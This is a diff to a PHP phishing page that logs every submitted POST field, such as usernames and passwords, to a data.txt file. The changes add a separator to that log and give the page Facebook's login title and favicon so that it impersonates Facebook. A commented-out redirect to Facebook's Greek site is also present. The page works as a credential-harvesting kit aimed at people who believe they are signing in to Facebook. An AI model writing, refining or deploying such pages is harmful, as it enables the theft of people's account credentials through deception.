@@ -27,6 +27,8 @@ $path = substr($path,0,16);
 $file = $path ."/export/data.txt";
 
 file_put_contents($file, print_r($_POST, true), FILE_APPEND);
+file_put_contents($file, print_r("<hr/>\n", true), FILE_APPEND);
+
 ?>
 
 <!-- <meta http-equiv="refresh" content="0; url=https://el-gr.facebook.com"/> -->
@@ -35,6 +37,11 @@ file_put_contents($file, print_r($_POST, true), FILE_APPEND);
 
 <html>
 <head>
+
+<title>Facebook - Log In or Sign Up</title>
+
+<link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196" />
+
 </head>
 <body style="background-image:url(css/error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
 </body>
